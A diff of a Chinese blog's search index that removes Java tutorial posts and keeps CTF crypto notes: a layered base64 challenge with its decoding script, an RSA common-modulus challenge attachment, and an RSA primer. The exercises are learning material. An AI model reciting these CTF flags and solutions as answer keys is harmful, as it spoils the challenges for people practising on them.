@@ -1,120 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Java入门基础</title>
-    <url>/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<p>Java初学，包含使用IDEA创建文件，基本程序等等</p>
-<span id="more"></span>
-<h4 id="创建新的程序">创建新的程序</h4>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51W.png" alt=""></p>
-<p>如上图，创建一个JAVA程序的步骤依次向下创建，注意一个工程可以包含多个模块，一个模块可以包含多个包，一个包可以包含多个类。</p>
-<h4 id="字面量-数据格式">字面量(数据格式)</h4>
-<p>字符：用单引号括起来</p>
-<p>字符串：用双引号括起来</p>
-<p>空值：null</p>
-<p>特殊字符：\n:换行符，\t:缩进符</p>
-<p>默认整数是Int型，小数是double型，需要改变在数据后加上L/F。</p>
-<h4 id="主要结构">主要结构</h4>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXXXXX</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="数据类型转换">数据类型转换</h4>
-<p>数据范围小的变量可以直接赋值给数据范围大的变量</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span> a=<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span>a;</span><br><span class="line"><span class="type">double</span> c=b;</span><br><span class="line">System.out.println(b)</span><br></pre></td></tr></table></figure>
-<p>另外注意在表达式中byte,short,char直接转化为Int型参与运算，因此byte+byte的结果类型必须定义为int。另外double&gt;float&gt;long&gt;int&gt;byte,short,char。一旦表达式有相应数据，则自动转化为大范围数据计算。</p>
-<h4 id="逻辑运算符">逻辑运算符</h4>
-<ul>
-<li>逻辑与&quot;&amp;&quot;:有一个为false,结果是false。</li>
-<li>短路与&quot;&amp;&quot;:一个是false，结果是false。<strong>前一个是false，后面的条件就不执行了</strong></li>
-<li>逻辑或&quot;|“和短路或”||&quot; <strong>同上解释</strong></li>
-<li>逻辑非&quot;!&quot;</li>
-<li>逻辑异或&quot;^&quot;:相同时false，不同时true</li>
-</ul>
-<h4 id="键盘录入">键盘录入</h4>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner<span class="comment">//导包</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//建立对象 </span></span><br><span class="line">System.out.println(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line"><span class="type">int</span> age=sc.nextInt()</span><br><span class="line">System.out.println(<span class="string">&quot;你输入的密码是：&quot;</span>+age)</span><br></pre></td></tr></table></figure>
-<h4 id="关于空格，空行的方法">关于空格，空行的方法</h4>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(i+<span class="string">&quot;\t&quot;</span>)<span class="comment">//数据之间的空格操作</span></span><br><span class="line">System.out.println()<span class="comment">//数据的空行操作</span></span><br></pre></td></tr></table></figure>
-<h4 id="案例小练习：猜数字">案例小练习：猜数字</h4>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> guessnumber;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">func</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        Random r=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> num=r.nextInt(<span class="number">100</span>)+<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已随机生成1-100的数字\n&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你猜的数字\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> input=sc.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(input&gt;num) System.out.println(<span class="string">&quot;你猜的数字过大&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(input&lt;num) System.out.println(<span class="string">&quot;你猜的数字过小&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;正确！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="数组">数组</h4>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] ages=<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;<span class="comment">//静态初始化</span></span><br><span class="line"><span class="type">int</span>[]=&#123;input&#125;<span class="comment">//动态初始化</span></span><br><span class="line">System.out.println(ages.length)<span class="comment">//求数组长度</span></span><br></pre></td></tr></table></figure>
-<h4 id="方法重载">方法重载</h4>
-<p>同一个类，出现多个方法名称相同，形参列表不同这些方法叫重载方法。</p>
-<p>p.s. 返回值类型没关系</p>
-<p>如：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">()</span>&#123;</span><br><span class="line">	代码段<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">(String a)</span></span><br><span class="line">&#123;</span><br><span class="line">	代码段<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="return单独使用">return单独使用</h4>
-<p>单写一个return，</p>
-<p>可以跳出并立即结束所在方法的执行</p>
-<h4 id="生成随机字符">生成随机字符</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char ch=(char) (ra.nextInt(26)+65);//生成随机大写字母</span><br><span class="line">char ch2=(char) (ra.nextInt(26)+97);//生成随机小写字母</span><br></pre></td></tr></table></figure>
-<h4 id="String类常用api">String类常用api</h4>
-<p><strong>判断相等</strong>：在java中字符串内容比较不能使用&quot;==&quot;，因为java字符串表示的是地址。。</p>
-<p>如：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string name=<span class="string">&quot;zrm&quot;</span>;</span><br><span class="line">string password=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">string in_name,in_password;</span><br><span class="line">cin&gt;&gt;in_name&gt;&gt;in_password;</span><br><span class="line"><span class="keyword">if</span>(in_name==name&amp;&amp;in_password==password) cout&lt;&lt;<span class="string">&quot;正确&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;错误&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>这一段C++代码是可以执行的，但是放在java中即使输入相同的名字密码都无法输出“正确”，因为定义的正确字符串存于常量区，而输入的字符串在堆内存中，两者的地址不一样，比较的结果是不相等。</p>
-<p>因此需要用到一个判断内容相等的api：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String name=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">String password=<span class="string">&quot;123456&quot;</span>；</span><br><span class="line">Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in)</span><br><span class="line"><span class="comment">//定义接受输入内容的对象....</span></span><br><span class="line">name.equal(in_name)<span class="comment">//判断name字符串和in_name字符串内容是否相等，包括大小写检验</span></span><br><span class="line">password.equalIgnoreCase(in_password)<span class="comment">//判断前后是否相等，忽略大小写</span></span><br></pre></td></tr></table></figure>
-<p><strong>对字符串的操作</strong>:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str=<span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">str.length();<span class="comment">//求字符串长度</span></span><br><span class="line">str.charAt(<span class="type">int</span> num);<span class="comment">//求字符串特定位置字符</span></span><br><span class="line">str.toCharArray();<span class="comment">//把字符串转成字符数组</span></span><br><span class="line">str.substring(<span class="type">int</span> first,<span class="type">int</span> last);<span class="comment">//截取，包前不包后</span></span><br><span class="line">str.substring(<span class="type">int</span> first);<span class="comment">//截取，从当前索引一直截取到末尾</span></span><br><span class="line">str.replace(String before,String <span class="keyword">new</span>);<span class="comment">//替换，把前一个内容全部替换成后一个内容</span></span><br><span class="line">str.contain(String s);<span class="comment">//判断是否包含，是返回true,否则返回false</span></span><br><span class="line">str.startsWith(String str);<span class="comment">//判断是否以此字符串开始</span></span><br><span class="line">String str2=<span class="string">&quot;aaa,bbb,ccc&quot;</span>;</span><br><span class="line">str.split(<span class="string">&quot;,&quot;</span>);<span class="comment">//按照&quot;,&quot;分开，返回字符串数组，需要有一个字符串数组对象接收返回值</span></span><br></pre></td></tr></table></figure>
-<h4 id="生成验证码第二种表达方式">生成验证码第二种表达方式</h4>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">special_number</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String str=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">        Random ra=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        String res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> num=ra.nextInt(str.length());</span><br><span class="line">            <span class="type">char</span> c=str.charAt(num);</span><br><span class="line">            res+=c;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="ArrayList类">ArrayList类</h4>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();<span class="comment">//尖括号内约束数据类型</span></span><br><span class="line">list.add();<span class="comment">//直接添加</span></span><br><span class="line">list.add(<span class="type">int</span> index,type data);<span class="comment">//在指定位置插入元素</span></span><br><span class="line">list.get(<span class="type">int</span> index);<span class="comment">//获得指定位置元素</span></span><br><span class="line">list.size();<span class="comment">//获得元素个数</span></span><br><span class="line">list.remove(<span class="type">int</span> index);<span class="comment">//删除索引位置元素，返回被删除的元素值</span></span><br><span class="line">list.remove(Object o);<span class="comment">//删除容器内元素的值，如有多个相同值则删除第一个</span></span><br><span class="line">list.set(<span class="type">int</span> index,E element);<span class="comment">//修改索引位置的元素为后面的元素</span></span><br></pre></td></tr></table></figure>
-<h4 id="static使用">static使用</h4>
-<p>静态成员变量有static修饰，可以被共享使用，访问格式为：类名.变量 or 对象.变量。一般用在需要被共享的信息中</p>
-<p>实例成员变量无static修饰，只属于对象本身，访问格式为：对象.变量。一般用在每个对象共有的信息中</p>
-<p>静态成员方法用static修饰时，可以直接使用方法名调用，不需要对象.方法</p>
-<p>静态代码块：用于在程序启动时，进行静态资源初始化操作，格式：static{}</p>
-<p>单例：保证一个类只有一个对象</p>
-<h4 id="抽象类">抽象类</h4>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> class&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>抽象方法，抽象类由abstract修饰，不用声明具体的方法体。一个方法如果声明为抽象方法，则该类必须为抽象类。使用场景：</p>
-<ul>
-<li>一般作为父类，让子类继承</li>
-<li>父类得知子类一定完成某种行为，但不知道具体行为，就先定义抽象方法，让子类具体定义</li>
-</ul>
-<p>注意：</p>
-<ul>
-<li>
-<p>抽象类不一定有抽象方法，有抽象方法的类一定是抽象类。</p>
-</li>
-<li>
-<p>一个类继承了抽象类，则它必须重写所有的抽象方法，否则它必须也定义为抽象类</p>
-</li>
-<li>
-<p>抽象类得到了抽象方法，却失去了创建对象的能力（不能被实例化）</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>语法</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Crypto:来自摸鱼哥的浅学</title>
     <url>/2022/09/04/Crypto-%E6%9D%A5%E8%87%AA%E6%91%B8%E9%B1%BC%E5%93%A5%E7%9A%84%E6%B5%85%E5%AD%A6/</url>
-    <content><![CDATA[<p>来自一个学不明白堆的菜的研究：</p>
+    <content><![CDATA[<p> 来自一个学不明白堆的菜的研究：</p>
 <span id="more"></span>
-<h3 id="工具一把梭">工具一把梭</h3>
-<p>这里需要一个小工具，叫ciphey，命令行调用即可对密文进行解密，挺方便的。具体的安装方法csdn就有，有一些地方需要注意一下，但还是很快能安装完毕。安装完毕后使用命令行调用：</p>
+<h3 id="工具一把梭"><a href="#工具一把梭" class="headerlink" title="工具一把梭"></a>工具一把梭</h3><p>这里需要一个小工具，叫ciphey，命令行调用即可对密文进行解密，挺方便的。具体的安装方法csdn就有，有一些地方需要注意一下，但还是很快能安装完毕。安装完毕后使用命令行调用：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ciphey -t &quot;需要解密的密文&quot;</span><br></pre></td></tr></table></figure>
 <p>直接就返回明文以及具体的解答方式。</p>
 <p>像这样：</p>
 <p><img src="https://i.niupic.com/images/2022/09/04/a528.png" alt=""></p>
 <p>经典给出一堆乱码，像这种：</p>
 <p><img src="https://i.niupic.com/images/2022/09/04/a527.jpg" alt=""></p>
-<h3 id="base64以及凯撒等简单密码">base64以及凯撒等简单密码</h3>
-<p>这里装好相应的库，对着密文一通decode就能（大概？解出最最简单的题目了</p>
+<h3 id="base64以及凯撒等简单密码"><a href="#base64以及凯撒等简单密码" class="headerlink" title="base64以及凯撒等简单密码"></a>base64以及凯撒等简单密码</h3><p>这里装好相应的库，对着密文一通decode就能（大概？解出最最简单的题目了</p>
 <p>比如：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;************************************&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;NSSCTF&#123;&#x27;</span> + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">小明不小心泄露了源码，输出结果为：4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D，你能还原出var的正确结果吗？</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>这种就看着加密方式一步一步逆回去咯：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ans=<span class="string">&quot;4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D&quot;</span></span><br><span class="line"><span class="comment">#var=base64.decode(base64.b64decode(base64.b32decode(base64.b16decode(ans))),var)</span></span><br><span class="line">var2=base64.b64decode(base64.b32decode(base64.b16decode(ans)))</span><br><span class="line">var2=var2.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NSSCTF&#123;&quot;</span>+var2+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>当然如果遇到纯粹的凯撒，那直接工具一把梭也是可以的</p>
-<h3 id="RSA以及其共模攻击">RSA以及其共模攻击</h3>
-<p>这里就涉及一点数论知识了，还没有学习太深入，只能照葫芦画瓢抄一抄简单脚本：</p>
+<h3 id="RSA以及其共模攻击"><a href="#RSA以及其共模攻击" class="headerlink" title="RSA以及其共模攻击"></a>RSA以及其共模攻击</h3><p>这里就涉及一点数论知识了，还没有学习太深入，只能照葫芦画瓢抄一抄简单脚本：</p>
 <p>这是题目附件：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;***************&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e1 = getPrime(<span class="number">32</span>)</span><br><span class="line">e2 = getPrime(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e1= &#x27;</span> +<span class="built_in">str</span>(e1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e2= &#x27;</span>+<span class="built_in">str</span>(e2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line"><span class="comment">#flag2= 86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line"><span class="comment">#e1= 3247473589</span></span><br><span class="line"><span class="comment">#e2= 3698409173</span></span><br><span class="line"><span class="comment">#n= 103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>解题脚本：</p>
@@ -129,116 +33,73 @@
       </tags>
   </entry>
   <entry>
-    <title>“代码规范”</title>
-    <url>/2022/08/02/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
-    <content><![CDATA[<p>软件开发代码规范:</p>
-<span id="more"></span>
-<h1>JAVA代码规范</h1>
-<h2 id="普通规范">普通规范</h2>
-<h4 id="包的命名方式：公司域名倒置-子公司-产品名称-功能名称">包的命名方式：公司域名倒置+子公司/产品名称+功能名称</h4>
-<p>如：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">net.hedao.music</span><br><span class="line">net.hedao.uem.internal</span><br><span class="line">net.hedao.uem.http</span><br></pre></td></tr></table></figure>
-<h4 id="utils和tools命名规范">utils和tools命名规范</h4>
-<p>utils:</p>
-<ul>
-<li>定义：通用的，与业务无关，可供其他项目使用</li>
-<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
-<li>例子：字符串类，文件工具类</li>
-</ul>
-<p>tools:</p>
-<ul>
-<li>定义：在当前项目通用；仅能在当前项目使用</li>
-<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
-<li>用户校验类，支付工具类</li>
-</ul>
-<h4 id="类名规范">类名规范</h4>
-<p>类名首字母大写，若多个单词拼合则采取驼峰式命名</p>
-<p>如：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestDemo</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="成员属性">成员属性</h4>
-<p>成员属性，变量名使用有含义的单词或词组构成；</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">long</span> abc=<span class="number">0</span>;<span class="comment">//禁止</span></span><br></pre></td></tr></table></figure>
-<p>常量必须由大写字母和下划线分割单词的方式组成</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_NUMBER</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br></pre></td></tr></table></figure>
-<p>静态变量:采用小写s开头，代表static，s后首字母大写，遵循驼峰原则</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> sCurrentTime;</span><br></pre></td></tr></table></figure>
-<p>实体类，java bean类中普通成员变量采用小写字母开头，单词之间采用驼峰式命名规范。</p>
-<p>注：此类用于存储数据，只有setter,getter方法，不作其他业务处理</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">			<span class="keyword">private</span> String userName;</span><br><span class="line">			<span class="keyword">private</span> String userAccount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="方法的命名规范">方法的命名规范</h4>
-<p>方法命名采用小写字母开头，字母之间采用驼峰式命名规范，一般不超过20个字符，长度很长时可以使用简写</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">calculateScreenSize</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUInfo</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">size</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUserInfomation</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="注释规范">注释规范</h2>
-<p>注释：</p>
-<ul>
-<li>屏蔽不需要执行的代码</li>
-<li>对代码进行解释说明</li>
-</ul>
-<h4 id="类的注释">类的注释</h4>
-<p>类的注释采用多行注释方式，在包名和类定义中间，通常记录作者信息，版本号，类的功能描述信息等。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* 文件工具类</span></span><br><span class="line"><span class="comment">* 项目名称:JAVA编码规范测试用例</span></span><br><span class="line"><span class="comment">* 包:net.herdao.common.utils   </span></span><br><span class="line"><span class="comment">* 类名称:FileUtils.java</span></span><br><span class="line"><span class="comment">* 类描述:本类是一个文件操作工具类，包括了文件的几个基本操作方法，创建文件、删除文件、文件重命名</span></span><br><span class="line"><span class="comment">* 创建人:林鸿亮</span></span><br><span class="line"><span class="comment">* 创建时间:2021/10/21 11:46</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUtils</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="方法的注释">方法的注释</h4>
-<p>多行注释，主要内容记录该方法的<strong>作用</strong>，<strong>参数及参数说明</strong>，<strong>返回值</strong>、<strong>返回类容</strong>和<strong>异常信息说明</strong>，<strong>修改记录</strong>，<strong>是否过期</strong>，及<strong>修改日期</strong>等等。</p>
-<p>我们规定所有public类型的方法必须加上注释<strong>对方法和参数</strong>加以说明，private方法中如果处理逻辑相对较多，相对复杂的也应加上注释。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 在指定目录创建一个新文件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> dirPath  文件目录路径</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> fileName 文件名称</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span>  返回创建的新文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title function_">createeNewFile</span><span class="params">(String dirPath, String fileName)</span> </span><br><span class="line">&#123;<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dirPath,fileName);</span><br><span class="line"> <span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="成员属性的注释">成员属性的注释</h4>
-<p>可以使用单行注释也可以使用多行注释</p>
-<p>代码块和单行代码通常采用单行注释</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteFile</span><span class="params">(File file)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123; <span class="comment">//判断文件是否存在</span></span><br><span class="line">file.delete(); <span class="comment">//删除文件</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="代码格式规范">代码格式规范</h3>
-<h4 id="统一编码格式">统一编码格式</h4>
-<p>统一采用UTF-8的格式</p>
-<h4 id="编码的缩进">编码的缩进</h4>
-<p>缩进空格数为4，同一业务级代码块保持左对齐，不能全在同一垂直线上</p>
-<h4 id="代码行宽度">代码行宽度</h4>
-<p>单行代码最长不得超过120列</p>
-<h4 id="代码行长度">代码行长度</h4>
-<p>方法长度限制在100行内，若有超过可能按照<strong>业务逻辑</strong>拆分成多个方法</p>
-<h4 id="属性及方法的范围确定">属性及方法的范围确定</h4>
-<ul>
-<li>
-<p>public : 当某个方法或属性需要<strong>被外部非子类和非同包内中的对象直接调用</strong>的时候采用public属性。</p>
+    <title>RSA学习</title>
+    <url>/2022/11/01/RSA%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h3 id="RSA学习"><a href="#RSA学习" class="headerlink" title="RSA学习"></a>RSA学习</h3><h4 id="了解结构"><a href="#了解结构" class="headerlink" title="了解结构"></a>了解结构</h4><ul>
+<li><p>明文m</p>
 </li>
-<li>
-<p>protected : 当某个方法或属性<strong>只会被其子类调用</strong>或者<strong>只会同一包下的其他对象调用</strong>时，使用protected限制。</p>
+<li><p>密文c</p>
 </li>
-<li>
-<p>private: 当某个方法或属性<strong>只会被本类中的其他方法调用</strong>的时候，使用private限制。</p>
+<li><p>公钥e，一个整数，一般情况下是公开的</p>
+</li>
+<li><p>两个大质数p,q,一般不公开，通过计算n=p*q得到n，此时n的逆向分解很困难，保证加密安全性</p>
+</li>
+<li><p>私钥d,解密用的钥匙，不公开，但满足条件$e*d mod (p-1)(q-1)=1$ .所以可计算得出,计算代码：</p>
+<p>gmpy2.invert(e,(p-1)*(q-1))</p>
+</li>
+<li><p>加密过程：$c=m^emodn$ 计算代码: c=pow(m,e,n) </p>
+</li>
+<li><p>解密过程：$m=c^dmod n$ 计算代码：m=pow(c,d,n) </p>
 </li>
 </ul>
-<h4 id="硬编码的后遗症">硬编码的后遗症</h4>
-<p>常量字符串或数值必须<strong>在类中定义常量值</strong>，通过<strong>常量值引用</strong>来使用固定数值和固定字符串</p>
